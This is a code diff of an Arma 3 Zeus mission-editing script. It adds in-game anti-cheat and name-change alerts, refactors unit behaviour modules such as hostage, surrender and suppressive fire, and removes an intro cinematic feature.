+							if (ctrlShown ((findDisplay 49) displayCtrl 13184)) then {
+								findDisplay 49 closeDisplay 0;
+							};
+						};
+					};
+
+					private _isGodMode = false;
+					while {uiSleep 0.1; true} do {
+						if !(missionNamespace getVariable ["MAZ_EZM_ServerProtection",true]) then {sleep 5; continue};
+						call _fnc_checkForCheaters;
+					};
+				};
+				fncnkf = ['', _fnc]; 
+				publicVariable 'fncnkf'; 
+				[[],{[] spawn (fncnkf # 1)}] remoteExec ['spawn', -2, 'jipfncnkf']; 
+				true
+			};
+
+			"Anti-Troll. Detect players joining with different names";
+			call {
+				[[], {
+					MAZ_EZM_PlayerTracker = createHashMap;
+
+					{
+						(getUserInfo _x) params ["_id","_owner","_uid","_name"];
+						MAZ_EZM_PlayerTracker set [_uid,[_name]];
+					}forEach allUsers;
+
+					["MAZ_EZM_trackConnections", "onPlayerConnected", {
+						params ["_id", "_uid", "_name", "_jip", "_owner"];
+						private _names = MAZ_EZM_PlayerTracker getOrDefault [_uid,[]];
+
+						"New player, add to list";
+						if(count _names == 0) exitWith {
+							_names pushBack _name;
+							MAZ_EZM_PlayerTracker set [_uid,_names];
+						};
+						"Player was in server before";
+
+						"His name has not changed";
+						if(_name in _names) exitWith {};
+
+						"NEW NAME! ALERT PLAYERS!";
+
+						if (missionNamespace getVariable ["MAZ_EZM_ServerProtection",true]) then {
+							private _string = format ["[ SERVER PROTECTION ] : Player %1 has joined previously with a different name.",_name];
+							private _string2 = format ["[ SERVER PROTECTION ] : %1's previous names: ",_name];
+							{
+								_string2 = _string2 + _x;
+								if(_forEachIndex < (count _names - 1)) then {
+									_string2 = _string2 + ", ";
+								};
+							}forEach _names;
+
+							_string remoteExec ["systemChat"];
+							_string2 remoteExec ["systemChat"];
+						};
+
+						"Save new name into list";
+						_names pushBack _name;
+						MAZ_EZM_PlayerTracker set [_uid,_names];
+					}] call BIS_fnc_addStackedEventHandler;
+				}] remoteExec ["spawn",2];
 			};
 		};
 
@@ -4942,20 +5396,31 @@ MAZ_EZM_fnc_initFunction = {
 					safeZoneX + safeZoneW / 1.5,
 					safeZoneY + safeZoneH / 1.3
 				] spawn BIS_fnc_typeText;
-				if (!isNil 'M9_EZM_EH_plugOverlayFix') then {
-					removeMissionEventHandler ['EachFrame', M9_EZM_EH_plugOverlayFix];
+				if (!isNil "M9_EZM_EH_plugOverlayFix") then {
+					removeMissionEventHandler ["EachFrame", M9_EZM_EH_plugOverlayFix];
 				};
 				M9_EZM_EH_plugOverlayFix = addMissionEventHandler ["EachFrame", {
 					(uinamespace getvariable ["RscTilesGroup", displayNull]) closeDisplay 0;
 				}]; 
 				sleep 90;
-				if (!isNil 'M9_EZM_EH_plugOverlayFix') then {
-					removeMissionEventHandler ['EachFrame', M9_EZM_EH_plugOverlayFix];
+				if (!isNil "M9_EZM_EH_plugOverlayFix") then {
+					removeMissionEventHandler ["EachFrame", M9_EZM_EH_plugOverlayFix];
 				};
-			}] remoteExec ['spawn', 0, 'EZM_PLUG_JIP'];
+			}] remoteExec ["spawn", 0, "EZM_PLUG_JIP"];
 			private _wl = missionNamespace getVariable ["MAZ_EZM_CuratorWhitelist",[]];
 			_wl = _wl + allCurators;
 			missionNamespace setVariable ["MAZ_EZM_CuratorWhitelist",_wl,true];
+
+			call MAZ_EZM_fnc_serverProtection;
+
+			[[], {
+				MAZ_EZM_broadcastServerFPS = true;
+				MAZ_EZM_serverFPS = 100;
+				while {MAZ_EZM_broadcastServerFPS} do {
+					MAZ_EZM_serverFPS = floor diag_fps;
+					sleep 1;
+				};
+			}] remoteExec ["spawn",2];
 		};
 
 		MAZ_EZM_fnc_fixDynamicGroups = {
@@ -5036,27 +5501,6 @@ MAZ_EZM_fnc_initFunction = {
 		MAZ_EZM_fnc_isNightTime = {
 			([date] call BIS_fnc_sunriseSunsetTime) params ["_sunrise","_sunset"];
 			dayTime > _sunset || dayTime < _sunrise
-		};
-
-		MAZ_EZM_fnc_getServerFPS = {
-			if(missionNamespace getVariable ["MAZ_EZM_isPingingServerFPS",false]) exitWith {};
-			missionNamespace setVariable ["MAZ_EZM_isPingingServerFPS",true];
-
-			MAZ_EZM_serverFPS = 0;
-			MAZ_EZM_serverResponded = false;
-			[[], {
-				[diag_fps,{
-					_this call {
-						uiNamespace setVariable ["MAZ_EZM_serverFPS",floor _this];
-						uiNamespace setVariable ["MAZ_EZM_serverResponded", true];
-					};
-				}] remoteExec ['call',remoteExecutedOwner];
-			}] remoteExec ['spawn',2];
-
-			[] spawn {
-				waitUntil {uiSleep 0.1; MAZ_EZM_serverResponded};
-				missionNamespace setVariable ["MAZ_EZM_isPingingServerFPS",false];
-			};
 		};
 
 	comment "EZM Eventhandlers";
@@ -5276,18 +5720,18 @@ MAZ_EZM_fnc_initFunction = {
 				if(_anim == "") then {   
 					[_args,"AmovPercMstpSnonWnonDnon"] remoteExec ["switchMove"];   
 					_args setBehaviour "AWARE";   
-					[_args,"Move"]remoteExec ["enableAI",0];   
-					[_args,"Anim"]remoteExec ["enableAI",0];   
+					[_args,"Move"] remoteExec ["enableAI"];
+					[_args,"Anim"] remoteExec ["enableAI"];
 					["Animation reset."] call MAZ_EZM_fnc_systemMessage;   
 				} else {   
 					(group _args) setBehaviour "CARELESS";   
-					[_args,"Move"]remoteExec ["disableAI",0];   
-					[_args,"Anim"]remoteExec ["disableAI",0];   
-					[_args,_anim] remoteExec ['switchMove',0];   
+					[_args,"Move"] remoteExec ["disableAI"];
+					[_args,"Anim"] remoteExec ["disableAI"];
+					[_args,_anim] remoteExec ["switchMove"];   
 					_args setVariable ["MAZ_EZM_animDone",   
 						_args addEventhandler ["AnimDone",{   
 							params ["_unit","_anim"];   
-							[_args,_anim] remoteExec ['switchMove'];   
+							[_args,_anim] remoteExec ["switchMove"];   
 						}],true
 					];   
 					if(_isCombat) then {   
@@ -5297,8 +5741,8 @@ MAZ_EZM_fnc_initFunction = {
 								_unit removeEventHandler [_thisEvent, _thisEventHandler]; 'ඞ'; 
 								[_unit,"AmovPercMstpSnonWnonDnon"] remoteExec ["switchMove"];   
 								_unit setBehaviour "COMBAT";   
-								[_unit,"Move"]remoteExec ["enableAI",0];   
-								[_unit,"Anim"]remoteExec ["enableAI",0];   
+								[_unit,"Move"] remoteExec ["enableAI"];
+								[_unit,"Anim"] remoteExec ["enableAI"];
 							}],true
 						];   
 					};   
@@ -5321,21 +5765,6 @@ MAZ_EZM_fnc_initFunction = {
 				params ["_values","_args","_display"];   
 				_display closeDisplay 2;   
 			},_entity] call MAZ_EZM_fnc_createDialog;   
-		};
-
-		MAZ_EZM_fnc_getNearestBuilding = {
-			params [
-				["_position",[0,0,0],[[],objNull]],
-				["_radius",50,[0]],
-				["_2d",false,[false]]
-			];
-			if(_position isEqualTo [0,0,0]) exitWith {["Provide a position argument to getNearestBuilding!","addItemFailed"] call MAZ_EZM_fnc_systemMessage};
-			if(_position isEqualType objNull) then {_position = getPos _position;};
-			private _nearestBuildings = (nearestObjects [_position, ["building"], _radius, _2d]) select {
-
-				count ([_x] call BIS_fnc_buildingPositions) > 0
-			};
-			(_nearestBuildings select 0)
 		};
 
 		MAZ_EZM_fnc_garrisonInstantModule = {
@@ -5387,10 +5816,10 @@ MAZ_EZM_fnc_initFunction = {
 							private _unit = _units select _forEachIndex;
 							_unit setPos _x;
 							_newUnits = _newUnits - [_unit];
-							[_unit,0] remoteExec ['forceSpeed',owner _unit];
+							[_unit,0] remoteExec ['forceSpeed'];
 							_unit addEventHandler ["Suppressed", {
 								params ["_unit", "_distance", "_shooter", "_instigator", "_ammoObject", "_ammoClassName", "_ammoConfig"];
-								[_unit,-1] remoteExec ['forceSpeed',owner _unit];
+								[_unit,-1] remoteExec ['forceSpeed'];
 							}];
 						};
 					}forEach _positions;
@@ -5468,10 +5897,10 @@ MAZ_EZM_fnc_initFunction = {
 					waitUntil {moveToCompleted _unit};
 					_unit setPos _pos;
 					_unit setBehaviour "SAFE";
-					[_unit,0] remoteExec ['forceSpeed',owner _unit];
+					[_unit,0] remoteExec ['forceSpeed'];
 					_unit addEventHandler ["Suppressed", {
 						params ["_unit", "_distance", "_shooter", "_instigator", "_ammoObject", "_ammoClassName", "_ammoConfig"];
-						[_unit,-1] remoteExec ['forceSpeed',owner _unit];
+						[_unit,-1] remoteExec ['forceSpeed'];
 					}];
 				};
 
@@ -5636,9 +6065,9 @@ MAZ_EZM_fnc_initFunction = {
 			params ["_entity"];
 			if(isNull _entity || !((typeOf _entity) isKindOf "Man")) exitWith {["Unit is not suitable.","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
 
-			[_entity,true] remoteExec ["setCaptive",0];
-			[_entity,"Move"]remoteExec ["disableAI",0];
-			[_entity,"Acts_AidlPsitMstpSsurWnonDnon_loop"] remoteExec["switchMove",0];
+			[_entity,true] remoteExec ["setCaptive"];
+			[_entity,"Move"] remoteExec ["disableAI"];
+			[_entity,"Acts_AidlPsitMstpSsurWnonDnon_loop"] remoteExec ["switchMove"];
 			private _holdActionIndex = [
 				_entity,											
 				"Free Hostage",										
@@ -5649,11 +6078,14 @@ MAZ_EZM_fnc_initFunction = {
 				{},
 				{},
 				{ 
-					_unit = (_this select 0);
-					[_unit,false] remoteExec ["setCaptive",0];
-					[_unit,"Move"]remoteExec ["enableAI",0];
-					[_unit,"AmovPercMstpSnonWnonDnon"] remoteExec["playMove",0];
-					[_unit] remoteExec ["removeAllActions",0];
+					params ["_unit","_caller"];
+					[_unit,false] remoteExec ["setCaptive"];
+					[_unit,"Move"] remoteExec ["enableAI"];
+					[_unit,"AmovPercMstpSnonWnonDnon"] remoteExec ["playMove"];
+					[_unit] remoteExec ["removeAllActions"];
+					["TaskSucceeded",["",format ["Hostage (%1) was freed by %2",name _unit,name _caller]]] remoteExec ['BIS_fnc_showNotification'];
+
+					remoteExec ["",_unit]; "Remove from JIP queue";
 				},
 				{},
 				[],
@@ -5666,14 +6098,15 @@ MAZ_EZM_fnc_initFunction = {
 			if(_entity getVariable ["MAZ_EZM_hostageEH",-1] == -1) then {
 				_entity setVariable ['MAZ_EZM_hostageEH',_entity addEventHandler ["Killed",{
 					params ["_unit", "_killer", "_instigator", "_useEffects"];
-					[_unit] remoteExec ["removeAllActions",0];
-					["TaskFailed",["",format ["Hostage (%1) was killed by %2",name _unit,name _killer]]] remoteExec ['BIS_fnc_showNotification',0];
+					[_unit] remoteExec ["removeAllActions"];
+					remoteExec ["",_unit];
+					["TaskFailed",["",format ["Hostage (%1) was killed by %2",name _unit,name _killer]]] remoteExec ['BIS_fnc_showNotification'];
 					[_unit,[
 						"Take Dogtag",
 						{
 							params ["_target", "_caller", "_actionId", "_arguments"];
-							["TaskSucceeded",["",format ["Hostage (%1) dogtag was taken by %2",name _target,name _caller]]] remoteExec ['BIS_fnc_showNotification',0];
-							[_target] remoteExec ["removeAllActions",0];
+							["TaskSucceeded",["",format ["Hostage (%1) dogtag was taken by %2",name _target,name _caller]]] remoteExec ['BIS_fnc_showNotification'];
+							[_target] remoteExec ["removeAllActions"];
 						},
 						nil,
 						1.5,
@@ -5681,7 +6114,7 @@ MAZ_EZM_fnc_initFunction = {
 						true,
 						"",
 						"_target distance _this < 5"
-					]] remoteExec ['addAction',0];
+					]] remoteExec ["addAction"];
 				}]];
 			};
 
@@ -5696,9 +6129,10 @@ MAZ_EZM_fnc_initFunction = {
 				params ["_nearestMan"];
 				_nearestMan addEventHandler ["Killed",{
 					params ["_unit", "_killer", "_instigator", "_useEffects"];
-					["TaskSucceeded",["",format ["%1 was killed by %2",name _unit,name _killer]]] remoteExec ['BIS_fnc_showNotification',0];
+					["TaskSucceeded",["",format ["%1 was killed by %2",name _unit,name _killer]]] remoteExec ['BIS_fnc_showNotification'];
+					remoteExec ["",_unit];
 				}];
-			}] remoteExec ['spawn',0,_entity];
+			}] remoteExec ["spawn",0,_entity];
 			["HVT created, all players will be notified of their death.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
 		};
 
@@ -5747,32 +6181,17 @@ MAZ_EZM_fnc_initFunction = {
 					}] remoteExec ["spawn"];
 					[format ["Difficulty set to %1.",_overrideValue]] call MAZ_EZM_fnc_systemMessage;
 				};
-				switch (_value) do {
-					case "easy": {
-						[[], {
-							{
-								_x setSkill 0;
-							} forEach allUnits;
-						}] remoteExec ["spawn"];
-						["Difficulty set to EASY."] call MAZ_EZM_fnc_systemMessage;
-					};
-					case "medium": {
-						[[], {
-							{
-								_x setSkill 0.5;
-							} forEach allUnits;
-						}] remoteExec ["spawn"];
-						["Difficulty set to MEDIUM."] call MAZ_EZM_fnc_systemMessage;
-					};
-					case "hard": {
-						[[], {
-							{
-								_x setSkill 1;
-							} forEach allUnits;
-						}] remoteExec ["spawn"];
-						["Difficulty set to HARD."] call MAZ_EZM_fnc_systemMessage;
-					};
+				private _skill = switch (_value) do {
+					case "easy": {0};
+					case "medium": {0.5};
+					case "hard": {1};
 				};
+				[_skill, {
+					{
+						_x setSkill _this;
+					} forEach allUnits;
+				}] remoteExec ["spawn"];
+				[format ["Difficulty set to %1.",toUpper _value]] call MAZ_EZM_fnc_systemMessage;
 				playSound 'addItemOk';
 				_display closeDisplay 1;
 			},{
@@ -5812,7 +6231,7 @@ MAZ_EZM_fnc_initFunction = {
 					params ["_mode"];
 					{
 						_x setUnitPos _mode;
-					}forEach allunits;
+					}forEach allUnits;
 				}] remoteExec ['spawn'];
 				[format ["All units stance mode set to %1.",_value],"addItemOk"] call MAZ_EZM_fnc_systemMessage;
 				_display closeDisplay 1;
@@ -5829,78 +6248,107 @@ MAZ_EZM_fnc_initFunction = {
 			private _isSurrendered = _entity getVariable ['EZM_isSurrendered',false];
 			if(_isSurrendered) then {
 				[_entity,"AmovPercMstpSnonWnonDnon"] remoteExec ["switchMove"];
-				[_entity,false] remoteExec ["setCaptive",0];
-				_entity setVariable ['EZM_isSurrendered',false,true];
+				[_entity,false] remoteExec ["setCaptive"];
+				_entity setVariable ["EZM_isSurrendered",false,true];
 				
 				["Unit is no longer surrendered.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
 			} else {
-				[_entity,["Surrender",_entity]] remoteExec ["action"];
-				[_entity,true] remoteExec ["setCaptive",0];
-				_entity setVariable ['EZM_isSurrendered',true,true];
+				_entity action ["Surrender",_entity];
+				[_entity,true] remoteExec ["setCaptive"];
+				_entity setVariable ["EZM_isSurrendered",true,true];
 				[_entity] spawn {
-					_dude = (_this select 0);
-					_weapon = currentWeapon _dude; 
+					params ["_entity"];
+					private _weapon = currentWeapon _entity; 
 					if(_weapon isEqualTo "") exitWith{};
-					[_dude, _weapon] remoteExec ['removeWeapon'];
+					[_entity, _weapon] remoteExec ["removeWeapon"];
 					sleep 0.1;
-					_weaponHolder = "WeaponHolderSimulated" createVehicle [0,0,0];
+					private _weaponHolder = "WeaponHolderSimulated" createVehicle [0,0,0];
 					_weaponHolder addWeaponCargoGlobal [_weapon,1];
-					_weaponHolder setPos (_dude modelToWorld [0,.2,1.2]);
-					_weaponHolder disableCollisionWith _dude;
-					_dir = random(360);
-					_speed = 1.5;
+					_weaponHolder setPos (_entity modelToWorld [0,.2,1.2]);
+					_weaponHolder disableCollisionWith _entity;
+					private _dir = random(360);
+					private _speed = 1.5;
 					_weaponHolder setVelocity [_speed * sin(_dir), _speed * cos(_dir),4]; 
 				};
 
 				["Unit is now surrendered.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
 			};
 		};
-		comment "TODO: Rewrite";
+
 		MAZ_EZM_fnc_suppressiveFireModule = {
 			params ["_entity"];
-			if(!(_entity isKindOf "CAManBase") && !(_entity isKindOf "StaticMGWeapon")) exitWith {["Object is not a man!.","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
-			if(_entity isKindOf "StaticMGWeapon") then {
-				if(gunner _entity == objNull) exitWith {["No gunner!.","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
-				_entity = gunner _entity;
-			};
-			if(_entity getVariable ["MAZ_EZM_isSuppressing",false]) exitWith {["Unit is already suppressing!.","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
-			["Suppressive Fire",[
+		
+			if (!(_entity isKindOf "CAManBase") && !(_entity isKindOf "AllVehicles")) exitWith {["This must be done to a vehicle or a unit!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
+			if(_entity isKindOf "AllVehicles" && isNull (gunner _entity)) exitWith {["This vehicle has no gunner!","addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
+			if (_entity getVariable ["MAZ_EZM_isSuppressing", false]) exitwith {["Unit is already suppressing!", "addItemFailed"] call MAZ_EZM_fnc_systemMessage;};
+
+			["Suppressive fire", [
 				[
 					"SLIDER",
 					"Duration of Suppress",
-					[5,20,10]
+					[5, 60, 10]
 				]
-			],{
-				params ["_values","_entity","_display"];
+			], {
+				params ["_values", "_entity", "_display"];
 				_values params ["_duration"];
 				_display closeDisplay 1;
-
-				["Position to Suppress",{
-					params ["_objects","_position","_args","_shift","_ctrl","_alt"];
-					_args params ["_entity","_duration"];
-
-					private _target = (createGroup [east,true]) createUnit ["O_Soldier_unarmed_F",_position,[],0,"CAN_COLLIDE"];
-					_target disableAI "MOVE";
-					_target hideObject true;
-					[_target, true] remoteExec ['hideObjectGlobal', 0];
-					_target setUnitPOs "UP";
+				
+				["Position to Suppress", {
+					params ["_objects", "_position", "_args", "_shift", "_ctrl", "_alt"];
+					_args params ["_entity", "_duration"];
+					
+					private _target = (creategroup [east, true]) createUnit ["O_Soldier_unarmed_F", _position, [], 0, "CAN_COLLIDE"];
+					_target disableAI "Move";
+					_target allowDamage false;
+					[_target,true] remoteExec ["hideObjectGlobal",2];
+					_target setUnitPos "UP";
 					_target addRating -100000000000;
-
-					[_entity,_duration,_target] spawn {
-						params ["_entity","_duration","_target"];
-						_entity setVariable ["MAZ_EZM_isSuppressing",true,true];
+					
+					[_entity, _duration, _target] spawn {
+						params ["_entity", "_duration", "_target"];
+						_entity setVariable ["MAZ_EZM_isSuppressing", true, true];
 						_entity doSuppressiveFire _target;
 						_entity suppressFor _duration;
-						sleep _duration;
+						private _behaviorPrior = behaviour _entity;
+						_entity setBehaviour "COMBAT";
+						_entity doWatch _target;
+
+						sleep 3;
+
+						private _timeToStop = time + _duration + 1;
+
+						
+						private _currentWeapon = currentWeapon _entity;
+						private _weaponModes = getArray (configFile >> "Cfgweapons" >> _currentWeapon >> "modes");
+						private _weaponMode = if("FullAuto" in _weaponModes) then {"FullAuto"} else {"Single"};
+						private _burstLength = 20;
+						private _reloadTime = getNumber (configFile >> "CfgWeapons" >> _currentWeapon >> _weaponMode >> "realodTime");
+						while {time < _timeToStop} do {
+							if !(_entity isKindOf "CAManBase") then {
+								_entity action ["useWeapon",_entity,gunner _entity,0];
+								sleep (0.5 + random 1.5);
+								continue;
+							};
+
+							private _roundsNumber = round (3 + random 2);
+							for "_i" from 0 to _roundsNumber do {
+								_entity forceWeaponFire [_currentWeapon, _weaponMode];
+								sleep _reloadTime;
+							};
+							_entity setVehicleAmmo 1;
+							sleep (0.5 + random 1.5);
+						};
+						
 						_entity doWatch objNull;
-						deleteVehicle _target;
-						_entity setVariable ["MAZ_EZM_isSuppressing",false,true];
+						deletevehicle _target;
+						_entity setBehaviour _behaviorPrior;
+						_entity setVariable ["MAZ_EZM_isSuppressing", false, true];
 					};
-				},_entity,[_entity,_duration],"a3\ui_f\data\igui\cfg\cursors\attack_ca.paa",45] call MAZ_EZM_fnc_selectSecondaryPosition;
-			},{
-				params ["_values","_args","_display"];
+				}, _entity, [_entity, _duration], "a3\ui_f\data\igui\cfg\cursors\attack_ca.paa", 45] call MAZ_EZM_fnc_selectSecondaryposition;
+			}, {
+				params ["_values", "_args", "_display"];
 				_display closeDisplay 2;
-			},_entity] call MAZ_EZM_fnc_createDialog;
+			}, _entity] call MAZ_EZM_fnc_createdialog;
 		};
 
 		MAZ_EZM_fnc_removeNVGsAddFlashlightsModule = {
@@ -5980,278 +6428,10 @@ MAZ_EZM_fnc_initFunction = {
 			},[]] call MAZ_EZM_fnc_createDialog;
 		};
 
-	comment "Cinematics";
-	comment "the plan here is as follows: when intro cinematic module is placed, a window pops up with one of two options: 'orbit' or 'dynamic'. in either case, the black bars appear for users, screen fades to black, and then the cinematic begins. The screen starts at black with a title and the name of the zeus'. If orbit is selected, the cinematic will be like a UAV flying above where the module was placed. Music choice can be selected, and up to 2 additional texts can be written to appear in the cinematic. once the cinematic ends, black screen appears again, and black bars fade.";
-	comment "maybe we should check if players are in a vehicle during cutscene, if so disable vehicle simulation";
-	comment "TODO: exclude curators from cutscene because it breaks their camera. instead, display systemChat showing status of cutscene.";
-
-	HYPER_fnc_splitMaxLine = {
-		params ["_inputString"];
-		private _maxLength = 22;
-		private _words = _inputString splitString " ";
-		private _lines = [];
-		private _currentLine = "";
-		
-		{
-			private _word = _x;
-			if (_currentLine isEqualTo "") then {
-				_currentLine = _word;
-			} else {
-				private _tentativeLine = format ["%1 %2", _currentLine, _word];
-				if (count _tentativeLine <= _maxLength) then {
-					_currentLine = _tentativeLine;
-				} else {
-					_lines pushBack _currentLine;
-					_currentLine = _word;
-				};
-			};
-		} forEach _words;
-		
-		if (!(_currentLine isEqualTo "")) then {
-			_lines pushBack _currentLine;
-		};
-		
-		_lines
-	};
-
-	HYPER_EZM_fnc_handleIntroCinematic = {
-		params ["_cinematicType","_backgroundSong","_intertitles", "_zeusCanSeeCutscene", "_postProcess", "_target"];
-
-		["Intro cinematic initiated for all players.","addItemOk"] call MAZ_EZM_fnc_systemMessage;
-
-		comment "if zeus shouldn't see the cutscene, we need to get the player set differenced with zeus player set";
-		private _allPlayers = [];
-		if(_zeusCanSeeCutscene) then {
-			comment "remove all curators except zeus who called the script";
-			private _zeusPlayers = allCurators apply {getAssignedCuratorUnit _x};
-			_allPlayers = (allPlayers - _zeusPlayers) + [player];
-		} else {
-			private _zeusPlayers = allCurators apply {getAssignedCuratorUnit _x};
-			_allPlayers = allPlayers - _zeusPlayers;
-		};
-
-		comment "get mission name";
-		private _briefingName = missionnamespace getvariable ["bis_fnc_moduleMissionName_name",""];
-		if (_briefingName == "") then {
-			_briefingName = briefingName;
-		};
-
-		comment "get zeus name(s)";
-		_author = "";
-		if (count allcurators > 0) then {
-			_authors = [];
-			{
-				_curatorPlayer = getassignedcuratorunit _x;
-				if (isplayer _curatorPlayer) then {_authors set [count _authors,name _curatorPlayer];};
-			} foreach allcurators;
-			{
-				_prefix = "";
-				if (_foreachindex > 0) then {
-					_prefix = if (_foreachindex == count _authors - 1) then {" &amp; "} else {", "};
-				};
-				_author = _author + _prefix + _x;
-			} foreach _authors;
-		} else {
-			_author = gettext (missionconfigfile >> "onLoadName");
-		};
-		if (_author != "") then {_author = format [localize "STR_FORMAT_AUTHOR_SCRIPTED",_author];};
-
-		comment "disable simulation on any vehicles to avoid crashing mid cutscene";
-		{
-			if !(_x == vehicle _x) then {
-				[vehicle _x, false] remoteExec ["enableSimulationGlobal", 2];
-			};
-		} forEach allPlayers;
-
-		comment "show intro titles";
-		switch (_backgroundSong) do {
-			case "epic": {playMusic "Music_Arrival";};
-			case "action": {playMusic "EventTrack02a_F_EPB";};
-			case "stealth": {playMusic "AmbientTrack02d_F_EXP";};
-			case "random": {playMusic (selectRandom ["EventTrack01a_F_EPA","EventTrack01a_F_EPB","EventTrack01_F_EPA","EventTrack03_F_EPB","EventTrack03a_F_EPB","EventTrack02b_F_EPC"]);};
-			default {playMusic "EventTrack01a_F_EPA";};
-		};
-		private _delay = 6;
-		[0, _delay, true, true] call BIS_fnc_cinemaBorder;
-		cutText ["", "BLACK", _delay];
-		[format["<t color='#ffffff' font='PuristaBold' size='2'>%1</t><t color='#B57F50' font='TahomaB' size='0.6'><br />%2</t>",_briefingName, _author],0,0.3,4,1,0,789] spawn BIS_fnc_dynamicText;
-
-		sleep _delay;
-		cutText ["", "PLAIN", 2];
-		comment "cutRsc
-		 [""SplashNoise"", ""PLAIN""];";
-
-		comment "show intertitles";
-		[_intertitles] spawn {
-			params ["_intertitles"];
-			private _line1 = [_intertitles # 0] call HYPER_fnc_splitMaxLine;
-			private _line2 = [_intertitles # 1] call HYPER_fnc_splitMaxLine;
-			sleep 3;
-			_line1 spawn BIS_fnc_infoText;
-			sleep 5;
-			_line2 spawn BIS_fnc_infoText;
-		};
-
-		comment "Post processing";
-		switch (_postProcess) do {
-			case "none": {
-				"colorCorrections" ppEffectAdjust[1,1,0,[0,0,0,0],[1,1,1,1],[0,0,0,0]];
-				"colorCorrections" ppEffectCommit 0;
-				"colorCorrections" ppEffectEnable true;
-			};
-			case "highcontrast": {
-				"colorCorrections" ppEffectAdjust [1, 0.9, -0.002, [0.0, 0.0, 0.0, 0.0], [1.0, 0.6, 0.4, 0.6],  [0.199, 0.587, 0.114, 0.0]];
-				"colorCorrections" ppEffectCommit 0;
-				"colorCorrections" ppEffectEnable true;
-			};
-			case "blue": {
-				"colorCorrections" ppEffectAdjust [1, 1, 0, [0.0, 0.0, 0.0, 0.0], [0.6, 0.6, 1.8, 0.7],  [0.199, 0.587, 0.114, 0.0]];
-				"colorCorrections" ppEffectCommit 0;
-				"colorCorrections" ppEffectEnable true;
-			};
-			case "dull": {
-				"colorCorrections" ppEffectAdjust [1, 0.8, -0.002, [0.0, 0.0, 0.0, 0.0], [0.6, 0.7, 0.8, 0.65],  [0.199, 0.587, 0.114, 0.0]];
-				"colorCorrections" ppEffectCommit 0;
-				"colorCorrections" ppEffectEnable true;
-			};
-			case "yellowgamma": {
-				"colorCorrections" ppEffectAdjust [1, 1, 0, [0.0, 0.0, 0.0, 0.0], [0.6, 1.4, 0.6, 0.7],  [0.199, 0.587, 0.114, 0.0]];
-				"colorCorrections" ppEffectCommit 0;
-				"colorCorrections" ppEffectEnable true;
-			};
-			case "greengamma": {
-				"colorCorrections" ppEffectAdjust [1, 1, 0, [0.0, 0.0, 0.0, 0.0], [1.8, 1.8, 0.3, 0.7],  [0.199, 0.587, 0.114, 0.0]];
-				"colorCorrections" ppEffectCommit 0;
-				"colorCorrections" ppEffectEnable true;
-
-			};
-		};
-
-		if (_cinematicType == "Flyby") then {
-			comment "in flyby mode, we select the module location as our target, and the camera paths are automatically designated at 0 and 90 degrees";
-			private _camTarget = "Land_HelipadEmpty_F" createVehicleLocal _target;
-			private _circleRadius = 200;
-			private _camHeight = 200;
-			private _camSrc0 = [_target select 0, (_target select 1) + _circleRadius, (_target select 2) + _camHeight];
-			private _camSrc90 = [(_target select 0) + _circleRadius, _target select 1, (_target select 2) + _camHeight];
-			
-			private _camera = "camera" camCreate _camSrc0;
-			_camera cameraEffect ["internal", "back"];
-			_camera camPrepareTarget _camTarget;
-			_camera camSetFov 1;
-			_camera camCommitPrepared 0;
-
-			_camera camPreparePos _camSrc90;
-			_camera camCommitPrepared 15;
-			waitUntil { camCommitted _camera };
-			cutRsc ["RscStatic", "PLAIN"];
-			sleep 0.4;
-			_camera cameraEffect ["terminate", "back"];
-			cutText ["", "BLACK IN", 2];
-			[1, 2, true, true] call BIS_fnc_cinemaBorder;
-
-		};
-
-		comment "clean up scripts";
-		if(_zeusCanSeeCutscene) then {
-			[] call MAZ_EZM_fnc_refreshInterface;
-		};
-
-		"colorCorrections" ppEffectAdjust[1,1,0,[0,0,0,0],[1,1,1,1],[0,0,0,0]];
-		"colorCorrections" ppEffectCommit 0;
-		"colorCorrections" ppEffectEnable true;
-
-		{
-			if !(_x == vehicle _x) then {
-				[vehicle _x, true] remoteExec ["enableSimulationGlobal", 2];
-			};
-		} forEach allPlayers;
-
-		["Intro cinematic completed."] call MAZ_EZM_fnc_systemMessage;
-
-	};
-
-	HYPER_EZM_fnc_introCinematicModule = {
-		params ["_entity"];
-		private _dialogTitle = "Intro Cinematic";
-		private _content = [
-			[
-				"COMBO",
-				"Cinematic Type",
-				[
-					["Flyby"],
-					["Flyby"],
-					0
-				]
-			],
-			[
-				"COMBO",
-				"Background Song",
-				[
-					["random", "epic", "action", "stealth"],
-					["Random Event Track", "Epic", "Action", "Stealth"],
-					0
-				]
-			],
-			[
-				"EDIT",
-				"Intertitle 1",
-				[
-					"",
-					1
-				]
-			],
-			[
-				"EDIT",
-				"Intertitle 2",
-				[
-					"",
-					1
-				]
-			],
-			[
-				"TOOLBOX:YESNO",
-				["Zeus Can See Cutscene?","Enabling this may break the camera for Zeus players."],
-				[false]
-			],
-							[
-				"COMBO",
-				"Post-Process Filter",
-				[
-					["none", "highcontrast", "blue", "dull", "yellowgamma", "greengamma"],
-					["None", "High Contrast", "Blue", "Dull", "Yellow Gamma", "Green Gamma"],
-					0
-				]
-			]
-		];
-		private _onConfirm = {
-			params ["_values", "_args", "_display"];
-			_values params ["_cinematicType","_backgroundSong","_text1","_text2","_zeusCanSeeCutscene","_postProcess"];
-			private _intertitles = [_text1,_text2];
-			private _target = [true] call MAZ_EZM_fnc_getScreenPosition;
-			[_cinematicType, _backgroundSong, _intertitles, _zeusCanSeeCutscene, _postProcess, _target] spawn HYPER_EZM_fnc_handleIntroCinematic;
-			_display closeDisplay 1;
-		};
-		private _onCancel = {
-			params ["_values", "_args", "_display"];
-			_display closeDisplay 2;
-		};
-		[
-			_dialogTitle,
-			_content,
-			_onConfirm,
-			_onCancel,
-			[]
-		] call MAZ_EZM_fnc_createDialog;
-		
-	};
-
-	comment "TODO: remove cinematic bars module that also un-blacks out screen";
-
 	comment "AI Supports";
 
 		MAZ_EZM_fnc_airDropSupportModule = {
-			params ["_pos","_mode","_direction","_vehType","_sideOf","_sfx"];
+			params ["_pos","_mode","_aioArsenal","_direction","_vehType","_sideOf","_sfx"];
 			private ["_typeMode","_dropType","_dropLoad","_dir","_vehPos","_doorAnim"];
